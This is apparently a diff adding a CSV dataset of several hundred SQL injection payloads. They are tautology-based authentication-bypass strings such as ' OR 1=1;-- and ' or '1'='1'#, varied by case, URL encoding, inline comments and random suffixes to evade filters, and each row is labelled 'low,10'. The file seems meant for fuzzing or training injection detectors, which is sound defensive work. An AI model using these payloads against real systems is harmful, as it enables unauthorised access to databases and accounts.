+'	OR	0=0	-- -- comment,low,10
+'+or+0=0+#+#+tfSGb,low,10
+'  oR  0=0  --,low,10
+'/**/OR/**/0=0/**/-- # MySQL comment,low,10
+""" or 0=0 -- # MySQL comment -- comment",low,10
+' or 0=0 # # comment # MySQL comment,low,10
+'/**/or/**/0=0/**/-- -- mxaewnid,low,10
+""" or 0=0 -- -- comment # JietwEAe",low,10
+'+oR+0=0+#,low,10
+""" OR 0=0 -- -- comment",low,10
+""" or 0=0 -- /* test */ # MySQL comment -- QxWofvT",low,10
+'+or+0=0+-- # TWnOXbhv,low,10
+'%20or%200=0%20--%20#%20WBCVe,low,10
+'%20OR%200=0%20-- /* TeSt */,low,10
+' or 0=0 -- -- OgkNJdx,low,10
+' OR 0=0 -- # mYsql COMMENT,low,10
+"""/**/OR/**/0=0/**/--",low,10
+"""+or+0=0+-- # PyzabwnXE",low,10
+'	or	0=0	--+#+MySQL+comment,low,10
+username' OR 1=1;--,low,10
+username' OR 1=1;# # MySQL comment,low,10
+"username"" OR 1=1;--",low,10
+col29' OR 1=1;--,low,10
+username' or 1=1;-- # MySQL comment,low,10
+username'	OR	1=1;--,low,10
+username' OR 1=1;-- -- comment,low,10
+tmpc39oi' OR 1=1;--,low,10
+username' OR 1=1;-- # xcYvauiGj,low,10
+username'/**/OR/**/1=1;--/**/--/**/amnOp,low,10
+username'	or	1=1;--,low,10
+tmpz0' OR 1=1;#,low,10
+username' OR 1=1;-- -- KduwhuY,low,10
+username'	OR	1=1;--	#	RYThGfQNZD,low,10
+username'/**/OR/**/1=1;--,low,10
+username'	OR	1=1;--	/*	test	*/,low,10
+USERNAME' or 1=1;-- /* test */,low,10
+uSERnaMe' Or 1=1;-- # MySQL comment,low,10
+"username""%20OR%201=1;--",low,10
+username' OR 1=1;-- /* test */ /* test */,low,10
+"username"" OR 1=1;-- # qVzfwnDT",low,10
+username'%20OR%201=1;--,low,10
+UX' or 1=1;--,low,10
+username'/**/or/**/1=1;--,low,10
+username' OR 1=1;-- /* test */,low,10
+USERNAME' OR 1=1;--,low,10
+USERNAME' or 1=1;--,low,10
+username'+OR+1=1;--,low,10
+username' OR 1=1;-- -- dInyW,low,10
+USERNAME'	OR	1=1;--	--	Yqnla,low,10
+username' OR 1=1;# # FWkGTe,low,10
+username'/**/OR/**/1=1;--/**/--/**/comment/**/--/**/njMzT,low,10
+username'	OR	1=1;-- -- comment,low,10
+username'	OR	1=1;#,low,10
+"username"" OR 1=1;-- -- VeTyvHedXC # KHwrarwcY",low,10
+username'%20or%201=1;--,low,10
+username' or 1=1;--,low,10
+UserNamE' or 1=1;--,low,10
+username' || 1=1;--,low,10
+username'+OR+1=1;-- # vjGiEFjW -- ESnyuSRGP,low,10
+username' OR 1=1;-- # chlIcaoc,low,10
+username' or 1=1;-- -- msnyy,low,10
+username' || 1=1;-- -- comment,low,10
+USERNAME'/**/or/**/1=1;--,low,10
+USErnAmE'%20Or%201=1;-- -- ygiUuI,low,10
+username' OR 1=1;-- -- uVFoo,low,10
+"username"" || 1=1;--",low,10
+USERNAME'+OR+1=1;--,low,10
+"uSERnAmE"" OR 1=1;--",low,10
+username'%20OR%201=1;--  --  fSzEr,low,10
+USERnAME'/**/or/**/1=1;--,low,10
+username' OR 1=1;#,low,10
+USeRNaMe' Or 1=1;--,low,10
+USERName' Or 1=1;-- -- cOmMent,low,10
+username' OR 1=1;-- -- fjYZxdK,low,10
+username' or 1=1;-- # yqlqkuinq,low,10
+username' OR 1=1;-- -- IGFRa /* test */,low,10
+username'+OR+1=1;--+#+zbXeHlWpFE # MySQL comment,low,10
+USERNAME' OR 1=1;-- # MuRnoa,low,10
+ztmf'%20OR%201=1;--,low,10
+USERNAME'%20or%201=1;--%20/*%20test%20*/,low,10
+username' OR 1=1;-- # Opzhv -- comment,low,10
+username'/**/OR/**/1=1;#/**/#/**/MySQL/**/comment,low,10
+USERNAME' OR 1=1;#,low,10
+USERNAME' OR 1=1;# -- comment,low,10
+USERNAME' or 1=1;-- # udZjFNPDv,low,10
+username'	||	1=1;--	#	VIAobm,low,10
+USErnaMe'	oR	1=1;--,low,10
+USERNAME'	OR	1=1;--,low,10
+username' or 1=1;#,low,10
+username'  OR  1=1;--,low,10
+USERNAME' or 1=1;-- # mYsql COMMENT,low,10
+username'  or  1=1;--,low,10
+username' OR 1=1;-- # MySQL comment,low,10
+tmplgj'+OR+1=1;--,low,10
+vcuf'/**/OR/**/1=1;-- # MySQL comment,low,10
+username' OR 1=1;# /* test */,low,10
+uSerNaME' oR 1=1;-- -- xvWMffhb,low,10
+USERNAME' or 1=1;-- # MySQL comment,low,10
+username' OR 1=1;-- # SZXuE,low,10
+username'/**/||/**/1=1;--/**/#/**/iHzwyRTMNu,low,10
+colk' OR 1=1;-- # MySQL comment # MySQL comment,low,10
+yo'/**/OR/**/1=1;--,low,10
+username' OR 1=1;-- -- Udmhsz,low,10
+"username"" OR 1=1;#",low,10
+username'%20||%201=1;--,low,10
+username'	OR	1=1;-- -- hSEvl,low,10
+username' || 1=1;-- # MySQL comment # MySQL comment,low,10
+"username""/**/OR/**/1=1;--",low,10
+uSERName' Or 1=1;-- /* tEsT */,low,10
+username' || 1=1;-- /* test */,low,10
+username' or 1=1;-- /* test */ -- ULTkBr,low,10
+"uSernaMe"" oR 1=1;--",low,10
+USERNAME' OR 1=1;-- /* TEST */,low,10
+ba3' OR 1=1;-- # MySQL comment,low,10
+col3' OR 1=1;-- /* test */ -- orGhXtKS,low,10
+username' OR 1=1;-- # RoXyBEyoC,low,10
+USERNAME'%20OR%201=1;--,low,10
+USERNAME' or 1=1;#,low,10
+username'/**/OR/**/1=1;#,low,10
+"username"" OR 1=1;-- -- gpMISJO",low,10
+uSeRName' oR 1=1;--,low,10
+unlqb3' OR 1=1;--,low,10
+USERname'+or+1=1;--,low,10
+USernAmE' OR 1=1;-- -- wTYBhcTmQA,low,10
+username' OR 1=1;-- -- Zmzkj /* test */,low,10
+username' OR 1=1;-- # oRYdkbowp,low,10
+tmp18db' OR 1=1;--,low,10
+USERNAME' OR 1=1;-- -- ODZUHFZTZ,low,10
+username'%20OR%201=1;#,low,10
+var0bu'+OR+1=1;--,low,10
+username'/**/||/**/1=1;-- # BYtzaswBAW,low,10
+uSeRnaME' OR 1=1;-- -- comment,low,10
+C8' OR 1=1;-- /* test */,low,10
+"username"" OR 1=1;-- -- comment",low,10
+"USERNAME""/**/OR/**/1=1;--",low,10
+username' || 1=1;-- # MySQL comment,low,10
+USERNAME'%20or%201=1;--,low,10
+USERNAME' OR 1=1;-- # yMjHbqZa,low,10
+"username"" OR 1=1;-- /* test */",low,10
+av62a5' OR 1=1;-- -- comment,low,10
+username'%20OR%201=1;-- # MySQL comment,low,10
+username'/**/||/**/1=1;--,low,10
+username' OR 1=1;# # PzSLxOho,low,10
+username' OR 1=1;-- # MySQL comment -- comment,low,10
+username'/**/OR/**/1=1;--/**/--/**/ybajtQOkr,low,10
+USERNAME' or 1=1;-- -- comment,low,10
+"username"" or 1=1;--",low,10
+"username"" OR 1=1;-- # sAqMEwCda",low,10
+"USERNAME"" || 1=1;-- -- ynRhnc",low,10
+username' or 1=1;-- /* test */,low,10
+username' OR 1=1;-- # MySQL comment -- ApqdfZiwV,low,10
+USERNAME' OR 1=1;-- -- bZUfAdoG,low,10
+UsERNaME'%20OR%201=1;#	#	MysQL	CoMmEnT,low,10
+tmpwv90h'%20or%201=1;--,low,10
+username'/**/||/**/1=1;#,low,10
+"USERNAME"" or 1=1;-- /* TEST */",low,10
+usERnaMe' OR 1=1;--,low,10
+tbln72'	OR	1=1;--	--	DEVQp	--	gjRxO,low,10
+"TMP52K"" or 1=1;-- # mYsql COMMENT # KLBoa",low,10
+USERNAME' OR 1=1;-- # lMmYl,low,10
+"username""+OR+1=1;--",low,10
+UsERNAme' oR 1=1;# # MySQL comment,low,10
+username'%20or%201=1;-- -- KdanHOBd,low,10
+username'	OR	1=1;#	#	YWImbjJpJ,low,10
+USeRnaMe' Or 1=1;-- /* TEst */ /* teSt */,low,10
+username'%20or%201=1;--%20#%20MySQL%20comment,low,10
+USERNAME'+||+1=1;--+/*+TEST+*/+#+ChkYjU,low,10
+xjpg'/**/||/**/1=1;-- /* test */,low,10
+xsb'+OR+1=1;--,low,10
+TMPJnCf' OR 1=1;--,low,10
+username'+OR+1=1;#,low,10
+USERNAME' OR 1=1;-- # ZTJDOCHQIW /* test */,low,10
+tbl2d'%20OR%201=1;--,low,10
+username' OR 1=1;# /* test */ -- comment,low,10
+"username""	OR	1=1;-- # kGvnLRaDTh",low,10
+uSERnamE' oR 1=1;-- -- cOMmEnt -- COmMent,low,10
+USERNAME'/**/||/**/1=1;--/**//*/**/TEST/**/*/,low,10
+username' || 1=1;# # KmCiyh # TSnzdMWuv,low,10
+username'+or+1=1;-- -- comment -- hmukfjrrwu -- ycfdg,low,10
+USErNaMe' or 1=1;--,low,10
+USERNAME' || 1=1;-- # SZZHMVPZNZ -- comment,low,10
+USERNAME'+OR+1=1;--+#+MYSQL+COMMENT+--+COMMENT,low,10
+YUEWSI'	or	1=1;--	--	COMMENT,low,10
+ciff'	OR	1=1;#,low,10
+USERNAME' or 1=1;-- # HGBUI -- comment,low,10
+usERNAME'/**/Or/**/1=1;-- # MySqL commENT,low,10
+username'  OR  1=1;#  #  wRtKhOK # MySQL comment,low,10
+username'	OR	1=1;--	--	CnYxbMGIE	#	MySQL	comment,low,10
+"A8A2YG""	OR	1=1;--",low,10
+username'+OR+1=1;--+/*+test+*/,low,10
+username'+or+1=1;--,low,10
+USERNAME'%20||%201=1;--%20--%20ZJIXLKWIUP,low,10
+UseRNaMe'+or+1=1;--,low,10
+username'%20OR%201=1;--%20/*%20test%20*/%20/*%20test%20*/,low,10
+usErName' OR 1=1;-- -- ltHonvLs,low,10
+username'	||	1=1;--,low,10
+username' || 1=1;#,low,10
+username'	||	1=1;--	/*	test	*/ -- comment,low,10
+username'+OR+1=1;--+#+odtIqiX+/*+test+*/,low,10
+USERNAME'+or+1=1;--,low,10
+username' OR 1=1;-- # KvBiTm -- comment,low,10
+"USERNAME"" OR 1=1;-- /* TEST */",low,10
+ufKqoH'%20Or%201=1;--,low,10
+username' OR 1=1;-- -- comment # KhaRDktKF -- pegPrNvCI,low,10
+username'	OR	1=1;-- # xOIABq,low,10
+"tblu"" OR 1=1;--",low,10
+tblde1' OR 1=1;-- /* test */,low,10
+username'+OR+1=1;--+--+MYjVQoM+--+comment+/*+test+*/,low,10
+username'%20||%201=1;--%20--%20OpNNYj,low,10
+USERNAME'/**/OR/**/1=1;#,low,10
+"username"" OR 1=1;-- -- pfLquI -- comment",low,10
+USERNAME'%20or%201=1;--%20/*%20TEST%20*/,low,10
+UsErnAme'+Or+1=1;--,low,10
+x4d84'%20OR%201=1;--,low,10
+uSERNAME'%20oR%201=1;--%20#%20MySQL%20comment%20#%20MySQL%20comment,low,10
+USERNAME'+OR+1=1;#,low,10
+USERNAME'/**/OR/**/1=1;--,low,10
+"username""	||	1=1;#",low,10
+"USErnAME""%20Or%201=1;-- -- OxNQeHhA",low,10
+USERNAME' OR 1=1;-- -- XRGftLGux,low,10
+"username"" || 1=1;-- -- OYdjMhuy",low,10
+USERNAME' or 1=1;# # comment,low,10
+USERNAME'	OR	1=1;-- # MYSQL COMMENT,low,10
+"USERNAME"" OR 1=1;-- -- COMMENT # MySQL comment # MySQL comment",low,10
+username' or 1=1;# # pjmwhceug # comment,low,10
+USERNAME' || 1=1;--,low,10
+vArYZ' oR 1=1;-- # MysQL coMmENt,low,10
+"username""%20OR%201=1;--%20#%20hvwREzeEK%20#%20MySQL%20comment",low,10
+UseRnamE'%20or%201=1;--,low,10
+B8YAMZ'  OR  1=1;--  /*  test  */,low,10
+col7' or 1=1;--,low,10
+username'/**/||/**/1=1;--/**/#/**/MySQL/**/comment/**/#/**/lgMnBCkDuf,low,10
+username'%20OR%201=1;# # NrfrAsr,low,10
+username'/**/OR/**/1=1;--/**//*/**/test/**/*/ -- comment,low,10
+AT0'	Or	1=1;--,low,10
+USERNAME'%20OR%201=1;--%20#%20JWWIRZ,low,10
+"useRnAME""%20Or%201=1;# /* test */",low,10
+username' OR 1=1;-- -- comment -- comment,low,10
+"username""	or	1=1;#",low,10
+userNaME'/**/Or/**/1=1;-- # MySQL comment,low,10
+USERNAME'/**/or/**/1=1;--/**//*/**/TEST/**/*//**/--/**/lSdpGz,low,10
+username'%20or%201=1;-- -- MJHyk,low,10
+username'	or	1=1;--	#	wdgpp,low,10
+AS'	OR	1=1;-- /* test */,low,10
+USERNAME'/**/||/**/1=1;--,low,10
+usErName' OR 1=1;#,low,10
+username'/**/OR/**/1=1;-- -- pYQJGRu,low,10
+"USERNAME"" OR 1=1;-- # MYSQL COMMENT",low,10
+username'+OR+1=1;--+--+lyUtBu/**/#/**/MySQL/**/comment,low,10
+usERnamE' || 1=1;-- # MySQL comment,low,10
+TBLFX' OR 1=1;-- -- COMMENT,low,10
+USERNAME' OR 1=1;-- -- COMMENT,low,10
+username' or 1=1;-- -- tHGfzbCC # jbufkiuB,low,10
+USERNAME'%20or%201=1;--%20--%20comment,low,10
+tblp'%20OR%201=1;#,low,10
+"USERNAME""+OR+1=1;#+#+MySQL+comment",low,10
+username'	OR	1=1;--	#	MySQL	comment -- XhLJFTpY,low,10
+uSERNAmE'+||+1=1;--,low,10
+cirb'	||	1=1;--	--	hElwQbxeYF,low,10
+USERnAmE' oR 1=1;-- # MySQL comment /* test */,low,10
+username' OR 1=1;# # comment,low,10
+username' || 1=1;-- # YFUbfzBwoX # MySQL comment,low,10
+"c5""%20OR%201=1;--%20#%20bwKTcjFcE",low,10
+username'+OR+1=1;-- -- QdRyOHVF,low,10
+username'/**/OR/**/1=1;-- # MySQL comment,low,10
+"username"" OR 1=1;-- # MySQL comment",low,10
+"username""	or	1=1;--	#	mysql	comment # WwHMFFr",low,10
+username' || 1=1;# # MySQL comment,low,10
+"USERNAME""	or	1=1;--",low,10
+' or '1'='1'#,low,10
+'%20or%20'1'='1'#,low,10
+' or '1'='1'# -- comment,low,10
+""" or ""1""=""1""# -- iptUai",low,10
+'	or	'1'='1'#	--	comment,low,10
+'+Or+'1'='1'#,low,10
+'+OR+'1'='1'#+#+MySQL+comment,low,10
+'/**/or/**/'1'='1'#,low,10
+' or '1'='1'# # EttqWa,low,10
+' or '1'='1'# # MySQL comment,low,10
+' or '1'='1'# # MySQL comment -- AZqxFaVUc,low,10
+'+or+'1'='1'#,low,10
+'	or	'1'='1'#,low,10
+""" or ""1""=""1""# # AkYhJQDVlr -- QvYiE",low,10
+'	OR	'1'='1'#,low,10
+' OR '1'='1'#,low,10
+"""/**/or/**/""1""=""1""#",low,10
+"""+or+""1""=""1""#",low,10
+' OR '1'='1'# -- oUQVXU,low,10
+""" or ""1""=""1""#",low,10
+'  or  '1'='1'#,low,10
+' or '1'='1'# /* test */,low,10
+' or '1'='1'# -- comment # MySQL comment,low,10
+'%20or%20'1'='1'# /* test */,low,10
+'	or	'1'='1'# -- comment,low,10
+' Or '1'='1'#,low,10
+'%20or%20'1'='1'# -- comment,low,10
+'/**/or/**/'1'='1'#/**/#/**/TSHzx,low,10
+'%20OR%20'1'='1'# -- COMMENT,low,10
+' || '1'='1'#,low,10
+'	OR	'1'='1'# # HaLOIlQO,low,10
+' or '1'='1'# # DybadWGA /* test */,low,10
+'	or	'1'='1'# # MySQL comment,low,10
+'%20or%20'1'='1'#%20#%20MySQL%20comment,low,10
+'%20or%20'1'='1'# # LjSiJolXpu,low,10
+'+or+'1'='1'#+/*+test+*/,low,10
+' OR '1'='1'# -- roFnlw,low,10
+' OR '1'='1'# -- comment,low,10
+""" or ""1""=""1""# # MySQL comment",low,10
+'%20OR%20'1'='1'#,low,10
+' or '1'='1'# -- RPhYQ,low,10
+' OR '1'='1'# # sgggc,low,10
+"""	or	""1""=""1""#",low,10
+' oR '1'='1'# # jjQnSHqSfK,low,10
+' or '1'='1'# -- MhAZAkD -- comment,low,10
+'/**/OR/**/'1'='1'#,low,10
+' or '1'='1'# -- comment # bwttetv,low,10
+' oR '1'='1'#,low,10
+' or '1'='1'# # uGgqgfA,low,10
+' or '1'='1'# # VtUtQlC,low,10
+' or '1'='1'# # eQQiUXz,low,10
+' or '1'='1'# # oMvNyFRnr,low,10
+'+or+'1'='1'# # XbGPKJU -- BPsbsUwY,low,10
+'+OR+'1'='1'#+#+BigQzHQkZ,low,10
+'+or+'1'='1'#+#+MySQL+comment+#+azDfSQKRm,low,10
+' OR '1'='1'# -- zBodnvc,low,10
+' or '1'='1'# -- aUQkftJlZ,low,10
+'+or+'1'='1'# -- comment,low,10
+'	oR	'1'='1'#,low,10
+' Or '1'='1'# /* teST */,low,10
+'+or+'1'='1'#+--+dLIEN,low,10
+'+OR+'1'='1'#,low,10
+' or '1'='1'# -- gIVHHrMA # MySQL comment,low,10
+'/**/or/**/'1'='1'#/**/#/**/MySQL/**/comment,low,10
+'/**/OR/**/'1'='1'#/**/--/**/TEUARD,low,10
+' or '1'='1'# -- JecpgRX,low,10
+'  or  '1'='1'# # xEiAjxyW,low,10
+' oR '1'='1'# # MBEhVD,low,10
+' Or '1'='1'# # ELIFxX,low,10
+'/**/or/**/'1'='1'#/**/#/**/VLkfBpzoK,low,10
+' or '1'='1'# # oiMAmcmjXM,low,10
+' or '1'='1'# /* test */ /* test */,low,10
+' or '1'='1'# # mysql comment,low,10
+'/**/or/**/'1'='1'#/**//*/**/test/**/*/ /* test */,low,10
+'/**/or/**/'1'='1'# -- ZQvOO,low,10
+'	oR	'1'='1'# # dsDQWJp,low,10
+'/**/or/**/'1'='1'# /* test */,low,10
+'%20or%20'1'='1'#	--	comment,low,10
+' or '1'='1'# # HQNzQDdRME -- comment,low,10
+'  or  '1'='1'# # BLirmHHu,low,10
+' or '1'='1'# # axjvt,low,10
+'/**/or/**/'1'='1'#/**/--/**/comment,low,10
+'  oR  '1'='1'#,low,10
+'%20or%20'1'='1'# # hsWihNHBmp,low,10
+'+OR+'1'='1'#+#+KOIZRG -- COMMENT,low,10
+' or '1'='1'# # MySQL comment # ATRcYhDhdZ,low,10
+'%20or%20'1'='1'#	/*	test	*/,low,10
+"""	or	""1""=""1""# /* test */",low,10
+' OR '1'='1'# /* test */ # NCoBv,low,10
+'/**/OR/**/'1'='1'#%20#%20MySQL%20comment,low,10
+' or '1'='1'# /* test */ # ansCtbO,low,10
+'/**/or/**/'1'='1'# # CckGmIKW,low,10
+""" or ""1""=""1""# -- QudIM",low,10
+"""%20or%20""1""=""1""# -- ATDDbUGC",low,10
+'/**/or/**/'1'='1'# -- comment,low,10
+'+OR+'1'='1'#+--+COMMENT # MIAaOPubXp,low,10
+'	or	'1'='1'#	#	COmmeNt,low,10
+' or '1'='1'# -- LWVyLqQV,low,10
+"""	or	""1""=""1""# # MySQL comment # FAXHHEsHI",low,10
+'%20or%20'1'='1'#%20#%20bkuasq,low,10
+' or '1'='1'# -- xZzYvuDzf,low,10
+' or '1'='1'# # BcGuY,low,10
+""" OR ""1""=""1""#",low,10
+'%20OR%20'1'='1'# -- PTDMZ -- comment,low,10
+' or '1'='1'# # MySQL comment # cpySYpO,low,10
+'+or+'1'='1'# /* test */,low,10
+' or '1'='1'# -- iiLKq # MySQL comment,low,10
+"""	or	""1""=""1""# # MySQL comment",low,10
+' or '1'='1'# -- comment /* test */ # MySQL comment,low,10
+'	or	'1'='1'#	#	MySQL	comment,low,10
+'/**/Or/**/'1'='1'#,low,10
+' OR '1'='1'# # ODRLHV,low,10
+'	OR	'1'='1'#	#	MYSQL	COMMENT,low,10
+' OR '1'='1'# # qpKJufTRD,low,10
+'/**/OR/**/'1'='1'#/**/--/**/NDxMMK,low,10
+""" or ""1""=""1""# # VSkecy",low,10
+'%20or%20'1'='1'#%20--%20heuLdFTSGz,low,10
+' or '1'='1'# -- comment -- comment,low,10
+'	OR	'1'='1'#	--	COMMENT,low,10
+'+Or+'1'='1'#+#+zoDnlMMKm,low,10
+' OR '1'='1'# -- COMMENT -- CKZJEJRSS,low,10
+'%20or%20'1'='1'#%20--%20WNRzqZJGJG,low,10
+'+OR+'1'='1'# -- fygKnj,low,10
+' OR '1'='1'# # MySQL comment # MySQL comment,low,10
+'/**/or/**/'1'='1'#/**//*/**/test/**/*/,low,10
+'/**/Or/**/'1'='1'# # MySQL comment,low,10
+'%20or%20'1'='1'#/**//*/**/test/**/*/,low,10
+' or '1'='1'# # comment # OpqVB,low,10
+'%20or%20'1'='1'# -- lPqWbt,low,10
+' OR '1'='1'# # JTALKY /* TEST */,low,10
+' or '1'='1'# # eadJyX,low,10
+'/**/Or/**/'1'='1'#/**//*/**/teSt/**/*/ -- pAHppip,low,10
+' OR '1'='1'# # xtKpByD,low,10
+' OR '1'='1'# -- hlHHGsQNB,low,10
+' or '1'='1'# # pzhVheS,low,10
+'	or	'1'='1'#	#	MySQL	comment -- comment,low,10
+'%20or%20'1'='1'# -- CYBgB,low,10
+'%20or%20'1'='1'#%20--%20comment,low,10
+'		OR		'1'='1'#	--	COMMENT,low,10
+' OR '1'='1'# /* TEST */,low,10
+'+||+'1'='1'#,low,10
+' or '1'='1'# # zwOcIhlxWR,low,10
+' or '1'='1'# -- jrFYIba,low,10
+'+or+'1'='1'#+/*+test+*/+#+MySQL+comment,low,10
+'%20OR%20'1'='1'#%20/*%20TEST%20*/,low,10
+' or '1'='1'# /* test */ -- yimbtAHV -- comment # DJIpAMDJEt,low,10
+' OR '1'='1'# # MySQL comment,low,10
+' or '1'='1'# # MySQL comment -- VBitRLipgf -- comment,low,10
+'/**/OR/**/'1'='1'# -- NNMlZf,low,10
+'/**/or/**/'1'='1'#/**/#/**/frbreni # gSbFsmpom,low,10
+'/**/oR/**/'1'='1'#/**//*/**/Test/**/*//**/--/**/eYAZfLzAZ,low,10
+' or '1'='1'# -- mXujAld -- LozCyd,low,10
+""" OR ""1""=""1""# -- WlKLrwCyNL",low,10
+""" OR ""1""=""1""# /* TEST */ -- COMMENT",low,10
+'+or+'1'='1'# # MySQL comment,low,10
+""" or ""1""=""1""# # mysql comment",low,10
+'	OR	'1'='1'# # TxiTol,low,10
+"""  or  ""1""=""1""#",low,10
+'/**/OR/**/'1'='1'#/**/#/**/AZUQTACPR,low,10
+' OR '1'='1'# -- COMMENT,low,10
+'/**/or/**/'1'='1'#/**/#/**/czptoiamzj,low,10
+' or '1'='1'# /* test */ -- VUFLTDwhjo,low,10
+' OR '1'='1'# -- IZZLG # rNhFbGar,low,10
+' OR '1'='1'# # COMMENT,low,10
+' OR '1'='1'# # MYSQL COMMENT -- bIGxxXSyHv,low,10
+'%20or%20'1'='1'#%20/*%20test%20*/ # MySQL comment,low,10
+' or '1'='1'# -- RbNNTjffXX,low,10
+'/**/OR/**/'1'='1'#/**/#/**/mYsql/**/COMMENT,low,10
+' or '1'='1'# -- comment -- xwAvwOdR -- comment,low,10
+' or '1'='1'# -- dCwOUX,low,10
+'/**/OR/**/'1'='1'#/**//*/**/test/**/*/,low,10
+'/**/or/**/'1'='1'#/**/--/**/IxOzSwkz,low,10
+' or '1'='1'# -- SbmIcz # wVjhQvAyFb,low,10
+'++or++'1'='1'#+#+MySQL+comment,low,10
+'	or	'1'='1'#	--	GBcMmjKwY,low,10
+""" or ""1""=""1""# -- comment # JKFcQNLNV",low,10
+'+or+'1'='1'#%20#%20ofccyjbo,low,10
+'+or+'1'='1'#+#+MySQL+comment,low,10
+'+or+'1'='1'#+--+QAYTozn /* test */,low,10
+'/**/or/**/'1'='1'#/**/--/**/ztIVneeL%20--%20JXuhBBHlY,low,10
+'	oR	'1'='1'#	--	comment,low,10
+'/**/or/**/'1'='1'#/**/#/**/UPnfLuPw,low,10
+' OR '1'='1'# /* test */ # IBMPQ,low,10
+' Or '1'='1'# # MySQL comment # MySQL comment,low,10
+""" or ""1""=""1""# # MySQL comment # MySQL comment",low,10
+'  or  '1'='1'# # MySQL comment,low,10
+' or '1'='1'# -- IxGTfsm,low,10
+' or '1'='1'# # mysql comment # MySQL comment -- comment,low,10
+' or '1'='1'# -- onKjANO,low,10
+""" or ""1""=""1""# -- comment /* test */",low,10
+' or '1'='1'# # pmnclajzkm -- comment,low,10
+' or '1'='1'# # cJamZg -- comment,low,10
+'%20or%20'1'='1'#%20/*%20test%20*/,low,10
+'%20or%20'1'='1'#%20#%20PFFVWID # dDGVHoP,low,10
+'	Or	'1'='1'#,low,10
+'	OR	'1'='1'#	#	UUAuMMv /* test */,low,10
+'%20oR%20'1'='1'#%20#%20MYSQL%20COmMenT,low,10
+'    or    '1'='1'#,low,10
+"""%20OR%20""1""=""1""#",low,10
+'/**/or/**/'1'='1'#/**/#/**/comment,low,10
+' or '1'='1'# # mCVJyXU -- cbjVyxD,low,10
+'%20or%20'1'='1'# # ZQpuc,low,10
+'/**/or/**/'1'='1'# # NdZRp,low,10
+'%20or%20'1'='1'# # MySQL comment,low,10
+'	or	'1'='1'#	#	EflAKs,low,10
+""" or ""1""=""1""# -- OKXXASZ",low,10
+'+or+'1'='1'# # eDiqbORu,low,10
+"""	or	""1""=""1""# /* test */ -- jybOwYFM",low,10
+' or '1'='1'# -- jmqrhJpS,low,10
+' or '1'='1'# # MySQL comment /* test */,low,10
+' OR '1'='1'# # EOISBARIS,low,10
+' OR '1'='1'# /* test */,low,10
+' or '1'='1'# -- HBoeW # MySQL comment /* test */,low,10
+'%20OR%20'1'='1'#%20#%20PDrSa # MySQL comment,low,10
+'+OR+'1'='1'#+#+comment,low,10
+"""+or+""1""=""1""#+--+unrWqG",low,10
+'+or+'1'='1'#+#+pELYMTirQE,low,10
+"""+or+""1""=""1""#	#	dptjmqo",low,10
+""" or ""1""=""1""# -- fGpCd -- GDxSAdto",low,10
+' OR '1'='1'# -- LYBTNNYN,low,10
+"""	or	""1""=""1""# -- comment",low,10
+' or '1'='1'# -- rScBsxmlr # MySQL comment,low,10
+' or '1'='1'# # hefaAEkr,low,10
+' or '1'='1'# # MySQL comment -- comment,low,10
+' Or '1'='1'# # MyPQCtGg,low,10
+' OR '1'='1'# # mYsql COMMENT,low,10
+' or '1'='1'# -- hVhfFyiU /* test */,low,10
+"""/**/or/**/""1""=""1""# /* test */",low,10
+'+OR+'1'='1'# # LhWXH,low,10
+"""+or+""1""=""1""# /* test */",low,10
+' oR '1'='1'# /* test */,low,10
+'%20or%20'1'='1'#%20#%20VsOeR,low,10
+'/**/or/**/'1'='1'#/**//*/**/test/**/*/%20--%20comment,low,10
+' or '1'='1'# # ymhaa,low,10
+'/**/or/**/'1'='1'# # MySQL comment -- comment,low,10
+'	or	'1'='1'# /* test */ /* test */,low,10
+' or '1'='1'# -- UVdIwoIfL -- Paxve -- comment,low,10
+'%20||%20'1'='1'#,low,10
+'+or+'1'='1'#+--+TFTVaNSe,low,10
+""" or ""1""=""1""# -- zPBTSjUR",low,10
+' or '1'='1'# # UdiFiZ,low,10
+'  OR  '1'='1'#  #  MySQL  comment,low,10
+'/**/or/**/'1'='1'# # idHCScWK -- comment,low,10
+' OR '1'='1'# -- COMMENT /* TEST */ # mYsql COMMENT,low,10
+'+OR+'1'='1'#/**//*/**/test/**/*/,low,10
+'%20or%20'1'='1'#%20/*%20test%20*/%20#%20wZmxjRTdUE,low,10
+'+or+'1'='1'#	#	MySQL	comment,low,10
+'/**/or/**/'1'='1'#+/*+test+*/,low,10
+' Or '1'='1'# -- COquwfwPp,low,10
+'	OR	'1'='1'#	/*	tesT	*/	--	XUGIE,low,10
+' or 1=1;#,low,10
+' OR 1=1;#,low,10
+'+or+1=1;#,low,10
+'%20or%201=1;#,low,10
+' or 1=1;# -- zSvVHYXpCy,low,10
+'	or	1=1;#,low,10
+'+OR+1=1;#,low,10
+""" or 1=1;#",low,10
+'/**/or/**/1=1;#,low,10
+' or 1=1;# # MySQL comment,low,10
+'/**/OR/**/1=1;# -- POygnl,low,10
+'/**/or/**/1=1;#/**/--/**/comment,low,10
+' or 1=1;# -- FIXUKxuq,low,10
+'%20or%201=1;# /* test */,low,10
+'%20or%201=1;# # AtGFRKJl,low,10
+' OR 1=1;# # DvVzdUN,low,10
+' or 1=1;# # bhlgT,low,10
+' or 1=1;# /* test */ -- comment,low,10
+'%20OR%201=1;#,low,10
+' or 1=1;# /* test */,low,10
+' OR 1=1;# # XZPbGbjJ,low,10
+'/**/or/**/1=1;# /* test */,low,10
+'%20or%201=1;# # kzaHCR,low,10
+' or 1=1;# # iCiNMK,low,10
+' or 1=1;# # MySQL comment # MySQL comment,low,10
+'  or  1=1;# # MySQL comment,low,10
+' or 1=1;# # MySQL comment /* test */,low,10
+'%20%20or%20%201=1;#,low,10
+' or 1=1;# -- KInZUE,low,10
+'	or	1=1;# # njbnD,low,10
+' or 1=1;# -- comment,low,10
+' or 1=1;# /* test */ /* test */,low,10
+' OR 1=1;# -- XUVYDBDYKH,low,10
+'/**/or/**/1=1;#/**//*/**/test/**/*/,low,10
+' or 1=1;# -- EffQPNp,low,10
+' oR 1=1;#,low,10
+'%20or%201=1;#%20--%20DdobZUv,low,10
+' or 1=1;# # yTKJe # lpyYhibvo,low,10
+""" OR 1=1;#",low,10
+' or 1=1;# -- OzQSJzozyr,low,10
+'/**/or/**/1=1;# # mWHpHlhFw,low,10
+' or 1=1;# -- comment /* test */,low,10
+"""/**/or/**/1=1;#",low,10
+'%20OR%201=1;#%20#%20MySQL%20comment,low,10
+'/**/or/**/1=1;# -- iWchTs,low,10
+' or 1=1;# # dZqOiZeKn,low,10
+'/**/OR/**/1=1;# # MySQL comment,low,10
+' or 1=1;# # MXzkLho,low,10
+' or 1=1;# -- KmNoSMeRy,low,10
+""" or 1=1;# # MySQL comment",low,10
+""" Or 1=1;#",low,10
